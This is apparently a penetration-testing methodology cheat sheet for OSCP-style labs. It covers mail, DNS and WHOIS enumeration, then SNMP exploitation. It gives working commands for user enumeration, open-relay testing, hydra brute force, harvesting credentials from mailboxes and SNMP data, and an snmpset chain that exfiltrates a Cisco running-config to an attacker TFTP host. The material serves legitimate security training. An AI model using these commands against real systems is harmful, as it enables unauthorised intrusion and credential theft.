# Service Enumeration Methodology — Ports 53, 43, 25, 110, 143 (DNS / WHOIS / SMTP / POP3 / IMAP)

Scope: what to run, in order, the moment nmap shows these ports open. Execution order = category order.

---

## 0. Baseline — before touching any single service

```bash
nmap -sV -sC -p 25,43,53,110,143 -oN mail-dns-scan <target>
nc -nv <target> 25
nc -nv <target> 110
nc -nv <target> 143
```

**Decision point:** banner reveals product/version (e.g. `Postfix`, `Exim`, `Dovecot`, `hMailServer`) → immediately searchsploit/CVE-search that exact version before manual enum, since a version-specific RCE can skip the rest of this list.

```bash
searchsploit <product> <version>
```

---

## 1. Port 53 — DNS

```bash
dig any <domain> @<target>
dig axfr <domain> @<target>          # zone transfer attempt
host -t axfr <domain> <target>
dnsrecon -d <domain> -n <target> -a  # -a = axfr
```

**Decision point:** if AXFR succeeds → you get the full zone (subdomains, internal hostnames, mail/DC hosts) — dump and pivot recon on every new hostname/IP found. If refused → move to brute force.

```bash
dnsenum <domain> --dnsserver <target>
gobuster dns -d <domain> -r <target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Decision point:** subdomains found → re-run nmap against each new host; look specifically for `mail.`, `smtp.`, `ns1/ns2.`, `vpn.`, `dev.`, `internal.`.

Reverse lookups if a range is in scope:

```bash
dig -x <ip> @<target>
```

---

## 2. Port 43 — WHOIS

```bash
whois <domain>
whois <target_ip>
```

**Decision point:** registrant org/email/tech-contact → feed into OSINT for phishing pretext or username-format guessing (e.g. `firstname.lastname@domain`); NS records returned here → cross-check against what port 53 actually serves (mismatch = possible additional attack surface / old infra).

Note: in OSCP-style internal labs, port 43 is often a red herring / low-value target — don't over-invest time here relative to the mail services.

---

## 3. Port 25 — SMTP

### 3.1 User enumeration

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <target>
smtp-user-enum -M EXPN -U <userlist> -t <target>
smtp-user-enum -M RCPT -U <userlist> -t <target>
```

**Decision point:** VRFY returns `250`/`252` for valid users → build a confirmed userlist → carry forward to POP3/IMAP/SSH/RDP brute force later. If VRFY disabled → try RCPT TO method (works even when VRFY is off, since it probes during a fake mail transaction).

Manual fallback (no tooling / need to see raw banner):

```bash
nc -nv <target> 25
VRFY root
EXPN admin
```

### 3.2 Open relay test

```bash
telnet <target> 25
MAIL FROM:<attacker@external.com>
RCPT TO:<victim@external.com>
DATA
Subject: test
relay test
.
QUIT
```

**Decision point:** relay accepted for external→external → open relay confirmed (report as finding; usable for spoofed phishing in scope-permitting engagements).

### 3.3 Version-specific

```bash
searchsploit exim
searchsploit postfix
```

**Decision point:** e.g. Exim `<4.87` → CVE-2017-16943/CVE-2019-10149 style local/remote exploit chains — check version match precisely before firing.

---

## 4. Port 110 — POP3

```bash
nc -nv <target> 110
USER <username>
PASS <password>
```

```bash
hydra -L <userlist> -P <passlist> pop3://<target>
nmap --script pop3-brute -p 110 <target>
nmap --script pop3-capabilities -p 110 <target>
```

**Decision point:** creds from the port-25-derived userlist + default/common passwords land → `LIST` and `RETR <n>` to pull mail contents; mailbox contents may contain further creds (password-reset emails, plaintext creds sent internally) → sweep for credential reuse.

```
LIST
RETR 1
```

---

## 5. Port 143 — IMAP

```bash
nc -nv <target> 143
a LOGIN <username> <password>
```

```bash
hydra -L <userlist> -P <passlist> imap://<target>
nmap --script imap-capabilities -p 143 <target>
```

**Decision point:** capabilities list shows `AUTH=PLAIN`/`LOGIN` without STARTTLS enforced → creds crackable via same brute list as POP3 in cleartext (sniff-worthy if MITM position exists later). Successful login → enumerate mailboxes:

```
a LIST "" "*"
a SELECT INBOX
a FETCH 1:* BODY[]
```

---

## Cross-service credential table

|Source|Feeds into|
|---|---|
|SMTP VRFY/EXPN/RCPT valid users|POP3/IMAP/SSH/RDP/web-login brute force userlist|
|WHOIS tech/registrant contacts|username-format guessing, phishing pretext|
|AXFR zone dump|new hostnames → re-scan → new attack surface|
|POP3/IMAP mail contents|plaintext creds, password-reset links, internal service names|

---

## Priority-ordered fast path (try first)

1. `dig axfr` / zone transfer on 53 — free win if misconfigured, near-zero effort.
2. SMTP VRFY/EXPN/RCPT user enum on 25 — cheapest way to build a real userlist.
3. Open relay check on 25 — quick, often overlooked, easy finding.
4. POP3/IMAP brute force using the SMTP-derived userlist — highest yield once userlist exists.
5. WHOIS — background/OSINT value only, don't burn exam time here early.

---

_Document why each command was run — the enumeration finding that justified it — for report writeup._

# SNMP (Port 161/UDP) Enumeration & Exploitation Methodology

Applies once nmap shows `161/udp open snmp` (or `10161`/TCP on some appliances). SNMP is UDP — always confirm with a UDP scan, TCP results alone will miss it.

---

## 1. Confirm & fingerprint

```bash
nmap -sU -p161 --open -sV <target_ip>
nmap -sU -p161 --script snmp-info,snmp-sysdescr -oN snmp-nmap.txt <target_ip>
```

**Decision point:** if the port shows `open|filtered` instead of `open` → UDP response is ambiguous (no ICMP unreachable). Don't discard the port; proceed straight to community string testing below, since a correct community string will get a real reply even when nmap is unsure.

---

## 2. Community string discovery

Try defaults first — this succeeds far more often than it should, especially on network gear and printers.

```bash
# Quick manual check of the classics
for c in public private manager admin cisco community; do
  echo "[*] $c"; snmpget -v1 -c $c <target_ip> 1.3.6.1.2.1.1.1.0
done
```

Automated sweep with `onesixtyone` (fast, good for a full subnet too):

```bash
# default community string list ships with the tool
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <target_ip>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i targets.txt   # for a subnet/list
```

Brute-force with a bigger wordlist if defaults fail:

```bash
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -u <target_ip> snmp
```

**Decision point:** community string found → note whether it's **read-only (RO)** or **read-write (RW)**. Test write access immediately (step 6) — RW is the highest-value finding on this whole surface.

```bash
# Confirm RW: a successful set = write access
snmpset -v1 -c <community> <target_ip> 1.3.6.1.2.1.1.4.0 s "pwn-test"
```

---

## 3. Full MIB walk

```bash
snmpwalk -v1 -c <community> <target_ip> . > snmpwalk-full.txt
snmpwalk -v2c -c <community> <target_ip> . >> snmpwalk-full.txt   # v2c gives bulk walk, often faster/more complete
```

One-shot structured summary (installed software, users, processes, network info, routes, TCP listeners) — this is usually your fastest win:

```bash
snmp-check -c <community> <target_ip>
```

Grep the raw walk for anything juicy while you read `snmp-check` output:

```bash
grep -iE "pass|pwd|credential|login|key|secret" snmpwalk-full.txt
```

---

## 4. Targeted OID pulls (when the full walk is huge / noisy)

|OID|Data|
|---|---|
|`1.3.6.1.2.1.1.1.0`|sysDescr — OS/version banner|
|`1.3.6.1.2.1.25.1.6.0`|hrSystemProcesses — running process count|
|`1.3.6.1.2.1.25.4.2.1.2`|hrSWRunName — **running processes** (full list)|
|`1.3.6.1.2.1.25.4.2.1.4`|hrSWRunPath — path of each running process|
|`1.3.6.1.2.1.25.6.3.1.2`|hrSWInstalledName — **installed software**|
|`1.3.6.1.4.1.77.1.2.25`|Windows user accounts|
|`1.3.6.1.2.1.25.4.2.1.5`|hrSWRunParameters — **process command-line args (often leaks creds/paths)**|
|`1.3.6.1.2.1.6.13.1.3`|tcpConnState — open TCP connections/listening ports|
|`1.3.6.1.2.1.4.21.1.1`|ipRouteTable — routing table (pivot recon)|
|`1.3.6.1.4.1.77.1.4.2`|Windows shares|
|`1.3.6.1.2.1.25.2.3.1.4`|hrStorageUsed — disk usage per volume|

```bash
snmpwalk -v2c -c <community> <target_ip> 1.3.6.1.2.1.25.4.2.1.2   # running processes
snmpwalk -v2c -c <community> <target_ip> 1.3.6.1.2.1.25.4.2.1.5   # process args -- check for embedded creds
snmpwalk -v2c -c <community> <target_ip> 1.3.6.1.2.1.6.13.1.3     # internal listening ports -> pivot candidates
```

**Decision point:** if `hrSWRunParameters` shows a service launched with `-p <password>` or a mapped drive/script with embedded creds → immediate credential capture, note it for the report and try against other discovered services (SSH/RDP/SMB) — see step 7.

---

## 5. Windows-specific OIDs (SNMP on a domain box)

```bash
snmpwalk -v1 -c <community> <target_ip> 1.3.6.1.4.1.77.1.2.25   # local user accounts
snmpwalk -v1 -c <community> <target_ip> 1.3.6.1.4.1.77.1.4.2    # shares
```

Cross-reference the user list against later Kerberos/SMB enumeration (kerbrute userenum, RID cycling) — SNMP is frequently the _first_ source of a valid username list on a box that otherwise blocks null-session enum.

---

## 6. Exploiting write access (RW community found)

If step 2 confirmed RW, escalate beyond the sanity-check set:

```bash
# Change sysContact/sysLocation - low-risk proof of write, good for report evidence
snmpset -v1 -c <rw_community> <target_ip> 1.3.6.1.2.1.1.4.0 s "owned-by-oscp"

# Cisco IOS: RW community + write access to running-config OID can allow config exfil/modification
# (requires TFTP server reachable from the device)
snmpset -v1 -c <rw_community> <target_ip> 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 4 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.3.1 i 1 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.4.1 a <your_tftp_ip> \
  1.3.6.1.4.1.9.9.96.1.1.1.1.5.1 s running-config \
  1.3.6.1.4.1.9.9.96.1.1.1.1.6.1 s exfil-config.txt \
  1.3.6.1.4.1.9.9.96.1.1.1.1.14.1 i 1
```

**Decision point:** Cisco config exfil succeeds → grep the pulled config for `enable secret`, `username ... password`, SNMP RW strings for other devices, and VTY/AUX line passwords — these frequently crack fast with hashcat (type 7 Cisco "encoding" is trivially reversible, type 5 is MD5-crypt).

```bash
# Cisco type 7 reversal (not real encryption)
python3 -c "import sys; from cisco_type7 import decrypt; print(decrypt('<type7_string>'))"
# or use an online/offline type-7 decoder tool
```

---

## 7. Credential reuse pivot

Any community string, username, or plaintext credential pulled via SNMP gets tried immediately against every other open service:

```bash
netexec smb <target_ip> -u <user_from_snmp> -p <cred_from_snmp>
netexec winrm <target_ip> -u <user_from_snmp> -p <cred_from_snmp>
hydra -l <user_from_snmp> -p <cred_from_snmp> ssh://<target_ip>
```

---

## Priority-ordered fast path (try these first)

1. **Default/common community strings** (`public`/`private`) via manual `snmpget` — near-zero cost, frequently works, especially on printers, network gear, ESXi hosts.
2. **`snmp-check`** full dump the moment any community string is confirmed — single command, structured output covering processes/software/users/shares.
3. **`hrSWRunParameters` (process args)** — the single highest-yield OID for leaked credentials.
4. **Write-access test** on any confirmed community string — RW SNMP on Cisco gear is a fast path to full device compromise via config exfil.
5. **Windows user/account OIDs** — cheap source of a valid username list for later Kerberos/SMB attacks.
6. **Community string brute-force** with `onesixtyone`/`hydra` only if the above all fail — highest time cost, lowest yield.

---

Document which OID/output justified each follow-up action (e.g. "hrSWRunParameters revealed plaintext service password → reused against SMB") — this chain of evidence is what OSCP report grading looks for, not just the final shell.